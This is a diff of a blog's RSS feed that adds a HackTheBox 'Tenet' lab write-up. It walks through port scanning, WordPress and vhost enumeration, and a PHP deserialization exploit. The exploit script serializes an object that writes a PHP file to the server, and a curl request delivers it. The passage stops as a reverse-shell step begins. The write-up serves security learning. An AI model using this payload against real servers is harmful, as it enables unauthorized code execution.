@@ -5,7 +5,523 @@
     <link>https://fahmifj.github.io/tags/linux/</link>
     <description>Recent content in Linux on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Mon, 14 Jun 2021 07:57:37 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 14 Jun 2021 21:46:38 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Tenet</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</link>
+      <pubDate>Mon, 14 Jun 2021 21:46:38 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</guid>
+      <description>Tenet is a medium difficulty Linux machine from Hack The Box. It features PHP deserialization vulnerability, which can be leveraged to gain a foothold. Enumerating the web configuration files finds a set of database credentials, and they are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</description>
+      <content:encoded><![CDATA[<p>Tenet is a medium difficulty Linux machine from Hack The Box. It features PHP deserialization vulnerability, which can be leveraged to gain a foothold. Enumerating the web configuration files finds a set of database credentials, and they are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>PHP deserialization attack</li>
+<li>Race-condition</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Gobuster</li>
+<li>PHP</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Full scan on Tenet discovers only two open ports: SSH on port 22 and an Apache web server on port 80.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>nmap -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> -T4 10.10.10.223 | grep <span style="color:#e6db74">&#39;^[0-9]&#39;</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f <span style="color:#ae81ff">1</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> | sed s/,$//<span style="color:#66d9ef">)</span>
+→ root@kali «tenet» «192.168.43.234» 
+$ nmap -sC -sV -p$ports -oA scans/full-tenet 10.10.10.223
+<span style="color:#75715e"># Nmap 7.80 scan initiated Tue Mar 16 23:32:46 2021 as: nmap -sC -sV -p22,80 -oA scans/full-tenet 10.10.10.223</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.223
+Host is up <span style="color:#f92672">(</span>0.059s latency<span style="color:#f92672">)</span>.
+Scanned at 2021-03-16 23:32:46 EDT <span style="color:#66d9ef">for</span> 17s
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ
+|   <span style="color:#ae81ff">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo<span style="color:#f92672">=</span>
+|   <span style="color:#ae81ff">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt
+80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-methods: 
+|_  Supported Methods: OPTIONS
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Tue Mar 16 23:33:03 2021 -- 1 IP address (1 host up) scanned in 16.80 seconds</span>
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p><code>nmap</code> already identified that this site shows the default page of Apache web server.</p>
+<p><div class="img-container"><img src="imgs/image-20210614165913959.png" alt="image-20210614165913959"  /></div>
+</p>
+<h4 id="gobuster">Gobuster</h4>
+<p>Running <code>gobuster</code> against the site reveals that there is a WordPress site.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ gobuster dir -u http://10.10.10.223/ -w /opt/SecLists/Discovery/Web-Content/common.txt -b 404,403 -x txt,php,bak -o gobuster/gobuster-nohostname
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.223/
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   403,404
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              txt,php,bak
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+<span style="color:#f92672">===============================================================</span>
+2021/06/14 06:08:53 Starting gobuster in directory enumeration mode
+<span style="color:#f92672">===============================================================</span>
+/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10918<span style="color:#f92672">]</span>
+/users.txt            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 7<span style="color:#f92672">]</span>    
+/wordpress            <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 316<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.223/wordpress/<span style="color:#f92672">]</span>
+                                                                                    
+<span style="color:#f92672">===============================================================</span>
+2021/06/14 06:11:20 Finished
+<span style="color:#f92672">===============================================================</span>
+</code></pre></div><p>Poking <code>/users.txt</code> returns a text &ldquo;Success&rdquo;, I don&rsquo;t know what&rsquo;s that means.</p>
+<p><div class="img-container"><img src="imgs/image-20210614171354046.png" alt="image-20210614171354046"  /></div>
+</p>
+<h4 id="wordpress">/wordpress</h4>
+<p>Somehow on <code>/wordpress</code>,  the site looks broken.</p>
+<p><div class="img-container"><img src="imgs/image-20210614171926106.png" alt="image-20210614171926106"  /></div>
+</p>
+<p>It turns out there is a hostname.</p>
+<p><div class="img-container"><img src="imgs/image-20210614172030551.png" alt="image-20210614172030551"  /></div>
+</p>
+<p>I&rsquo;ll add tenet.htb to my <code>/etc/hosts</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ echo <span style="color:#e6db74">&#39;tenet.htb 10.10.10.223&#39;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>Poking <code>curl</code> shows that this port has different contents when we visit it with a hostname.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ curl -s http://10.10.10.223 | wc -c
+<span style="color:#ae81ff">10918</span>
+→ root@kali «tenet» «10.10.14.31» 
+$ curl -s http://tenet.htb | wc -c 
+<span style="color:#ae81ff">10581</span>
+</code></pre></div><p>From here, I&rsquo;ll separate the enumeration on new section.</p>
+<h3 id="tcp-80---tenethtb">TCP 80 - tenet.htb</h3>
+<p>Probably <code>http://10.10.10.223/wordpress/</code> is redirected to <code>tenet.htb</code> by the web server.</p>
+<p><div class="img-container"><img src="imgs/image-20210614173225299.png" alt="image-20210614173225299"  /></div>
+</p>
+<p>There is one post titled with &ldquo;Migrations&rdquo; states that they&rsquo;re currently migrating the data from a flat file.</p>
+<p><div class="img-container"><img src="imgs/image-20210614173704577.png" alt="image-20210614173704577"  /></div>
+</p>
+<blockquote>
+<p>/etc/passwd and /etc/shadow are the examples of what is known as a flat file structure.</p>
+</blockquote>
+<p>At the bottom, there is one user commented on the migration post which is probably the hint.</p>
+<p><div class="img-container"><img src="imgs/image-20210614174052879.png" alt="image-20210614174052879"  /></div>
+</p>
+<p>I&rsquo;ll note that &ldquo;sator php&rdquo; file and also a backup of that file.</p>
+<h4 id="wpscan">WPScan</h4>
+<p>I ran a <code>wpscan</code>  to find some database backup or something related with that, but I didn&rsquo;t find anything except usernames.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ wpscan --url http://tenet.htb/ -e vp,vt,cb,dbe,u1-15                                                          
+_______________________________________________________________
+         __          _______   _____
+         <span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
+          <span style="color:#ae81ff">\ \ </span> /<span style="color:#ae81ff">\ </span> / /| |__<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>___   ___  __ _ _ __ ®
+           <span style="color:#ae81ff">\ \/</span>  <span style="color:#ae81ff">\/</span> / |  ___/ <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span>/ __|/ _<span style="color:#e6db74">`</span> | <span style="color:#960050;background-color:#1e0010">&#39;</span>_ <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>            <span style="color:#ae81ff">\ </span> /<span style="color:#ae81ff">\ </span> /  | |     ____<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>__| <span style="color:#f92672">(</span>_| | | | |
+             <span style="color:#ae81ff">\/</span>  <span style="color:#ae81ff">\/</span>   |_|    |_____/ <span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>_,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+...&lt;SNIP&gt;...
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> protagonist
+ | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+ | Confirmed By:
+ |  Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+ |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |   - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+ |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> neil
+ | Found By: Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ | Confirmed By: Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</code></pre></div><h4 id="directory-brute-force-guessing">Directory brute-force (Guessing)</h4>
+<p>I tried to guess the location of sator php files with <code>curl</code> but it returned with 404.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ <span style="color:#66d9ef">for</span> i in sator.php sator.php.bak; <span style="color:#66d9ef">do</span> curl -sIL http://tenet.htb/$i; <span style="color:#66d9ef">done</span>
+HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
+Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 10:51:50 GMT
+Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
+
+HTTP/1.1 <span style="color:#ae81ff">404</span> Not Found
+Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 10:51:51 GMT
+Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
+</code></pre></div><h3 id="vhost-enumeration">Vhost enumeration</h3>
+<p>Next, I&rsquo;ll try to enumerate vhost, but first I&rsquo;ll use <code>cewl</code> to generate a custom wordlist. Because &ldquo;sator&rdquo; and &ldquo;backup&rdquo; are consists of 5 characters, I&rsquo;ll set the minimum word length to 5.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ cewl -m <span style="color:#ae81ff">5</span> -w wordlist-vhost http://tenet.htb
+CeWL 5.4.6 <span style="color:#f92672">(</span>Exclusion<span style="color:#f92672">)</span> Robin Wood <span style="color:#f92672">(</span>robin@digi.ninja<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>https://digi.ninja/<span style="color:#f92672">)</span>
+</code></pre></div><p>I&rsquo;ll use that wordlist with <code>ffuf</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ ffuf -w wordlist-vhost -u http://10.10.10.223 -H <span style="color:#e6db74">&#34;Host: FUZZ.tenet.htb&#34;</span> -mc <span style="color:#ae81ff">200</span>
+
+        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+
+       v1.3.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.223
+ :: Wordlist         : FUZZ: wordlist-vhost
+ :: Header           : Host: FUZZ.tenet.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : <span style="color:#ae81ff">10</span>
+ :: Threads          : <span style="color:#ae81ff">40</span>
+ :: Matcher          : Response status: <span style="color:#ae81ff">200</span>
+________________________________________________
+
+fields                  <span style="color:#f92672">[</span>Status: 200, Size: 10918, Words: 3499, Lines: 376<span style="color:#f92672">]</span>
+branding                <span style="color:#f92672">[</span>Status: 200, Size: 10918, Words: 3499, Lines: 376<span style="color:#f92672">]</span>
+migration               <span style="color:#f92672">[</span>Status: 200, Size: 10918, Words: 3499, Lines: 376<span style="color:#f92672">]</span>
+</code></pre></div><p>Oops, it was a mess.</p>
+<p>I&rsquo;ll filter out  <code>Lines 376</code> by adding <code>-fl 376</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ ffuf -w wordlist-vhost -u http://10.10.10.223 -H <span style="color:#e6db74">&#34;Host: FUZZ.tenet.htb&#34;</span> -mc <span style="color:#ae81ff">200</span> -fl <span style="color:#ae81ff">376</span>
+
+        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+
+       v1.3.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.223
+ :: Wordlist         : FUZZ: wordlist-vhost
+ :: Header           : Host: FUZZ.tenet.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : <span style="color:#ae81ff">10</span>
+ :: Threads          : <span style="color:#ae81ff">40</span>
+ :: Matcher          : Response status: <span style="color:#ae81ff">200</span>
+ :: Filter           : Response lines: <span style="color:#ae81ff">376</span>
+________________________________________________
+
+:: Progress: <span style="color:#f92672">[</span>93/93<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">11</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:05<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+
+</code></pre></div><p>But didn&rsquo;t find any (damn this tool is insanely fast, took 5 sec).</p>
+<h3 id="apache-default-page-revisit">Apache Default Page (Revisit)</h3>
+<p>Another guessing, I think the keyword is &ldquo;Migration&rdquo;, so probably before moving into <code>/wordpress/</code>, the site was previously hosted at  <code>/</code> (the root).</p>
+<p>I found the files that user Neil was talking about at  <code>http://10.10.10.223/[here]</code>, without the hostname:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ <span style="color:#66d9ef">for</span> i in sator.php sator.php.bak; <span style="color:#66d9ef">do</span> curl -sIL http://10.10.10.223/$i; <span style="color:#66d9ef">done</span>
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 11:21:04 GMT
+Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 11:21:05 GMT
+Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Last-Modified: Thu, <span style="color:#ae81ff">17</span> Dec <span style="color:#ae81ff">2020</span> 09:52:50 GMT
+ETag: <span style="color:#e6db74">&#34;202-5b6a5f47911e4&#34;</span>
+Accept-Ranges: bytes
+Content-Length: <span style="color:#ae81ff">514</span>
+Content-Type: application/x-trash
+</code></pre></div><p><code>Sator.php</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ curl -s http://10.10.10.223/sator.php
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Grabbing users from text file &lt;br&gt;
+<span style="color:#f92672">[]</span> Database updated &lt;br&gt;
+</code></pre></div><p><code>sator.php.bak</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
+$ curl -s http://10.10.10.223/sator.php.bak
+&lt;?php
+
+class DatabaseExport
+<span style="color:#f92672">{</span>
+        public $user_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;users.txt&#39;</span>;
+        public $data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+
+        public <span style="color:#66d9ef">function</span> update_db<span style="color:#f92672">()</span>
+        <span style="color:#f92672">{</span>
+                echo <span style="color:#e6db74">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span>;
+                $this-&gt; data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Success&#39;</span>;
+        <span style="color:#f92672">}</span>
+
+
+        public <span style="color:#66d9ef">function</span> __destruct<span style="color:#f92672">()</span>
+        <span style="color:#f92672">{</span>
+                file_put_contents<span style="color:#f92672">(</span>__DIR__ . <span style="color:#e6db74">&#39;/&#39;</span> . $this -&gt;user_file, $this-&gt;data<span style="color:#f92672">)</span>;
+                echo <span style="color:#e6db74">&#39;[] Database updated &lt;br&gt;&#39;</span>;
+        //      echo <span style="color:#e6db74">&#39;Gotta get this working properly...&#39;</span>;
+        <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+
+$input <span style="color:#f92672">=</span> $_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;arepo&#39;</span><span style="color:#f92672">]</span> ?? <span style="color:#e6db74">&#39;&#39;</span>;
+$databaseupdate <span style="color:#f92672">=</span> unserialize<span style="color:#f92672">(</span>$input<span style="color:#f92672">)</span>;
+
+$app <span style="color:#f92672">=</span> new DatabaseExport;
+$app -&gt; update_db<span style="color:#f92672">()</span>;
+
+
+?&gt;
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="object-injectiondeserialization-attack">Object Injection/Deserialization attack</h4>
+<p>From the previous code, <code>sator.php.bak</code> contains a PHP magic function called <code>__destruct()</code>. I&rsquo;m not skilled enough to explain it on detail, but that function will be called when there is no more references to an object:</p>
+<pre><code>$app = new DatabaseExport;
+$app -&gt; update_db(); 
+// __destruct is called afterwards
+// [] Database updated will be printed out
+</code></pre><p>Examples:</p>
+<p><div class="img-container"><img src="imgs/image-20210614190334075.png" alt="image-20210614190334075"  /></div>
+</p>
+<p>There is no input validation/sanitization on the <code>$input</code> variable, I could send a serialized object of DatabaseExport which contains malicious things by assuming that <code>sator.php</code> uses the same code as <code>sator.php.bak</code>.</p>
+<p>Also since <code>unserialize</code> is called before the creation of object (<code>$app</code>), I&rsquo;ll use the opposite magic function called <code>__construct()</code>.</p>
+<pre><code>$input = $_GET['arepo'] ?? '';
+$databaseupdate = unserialize($input);
+
+$app = new DatabaseExport;
+$app -&gt; update_db();
+</code></pre><h4 id="testing-payload">Testing Payload</h4>
+<p>First, I&rsquo;ll just do some testing with this script below and save it to a file called <code>tenetization.php</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
+{
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
+        {
+        		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_file</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;test.php&#39;</span>;
+                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>;
+        }
+}
+$o <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>();
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($o));
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>URL encode there because I&rsquo;m going to use <code>curl</code> to interact with the site. I&rsquo;ll run that script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
+$ php tenetization.php
+O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D
+</code></pre></div><p>If I don&rsquo;t have PHP. I could use <a href="https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler">this site</a> to get output of my PHP script.</p>
+<p>I&rsquo;ll send that output to <code>sator.php</code> via <code>curl</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
+$ curl -sI <span style="color:#e6db74">&#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D&#34;</span>
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Mon, <span style="color:#ae81ff">14</span> Jun <span style="color:#ae81ff">2021</span> 12:43:43 GMT
+Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+</code></pre></div><p>And that works!</p>
+<p><div class="img-container"><img src="imgs/image-20210614194451145.png" alt="image-20210614194451145"  /></div>
+</p>
+<h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
+<p>I&rsquo;ll modify the file name and the data for reverse shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
+{
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct()
+        {
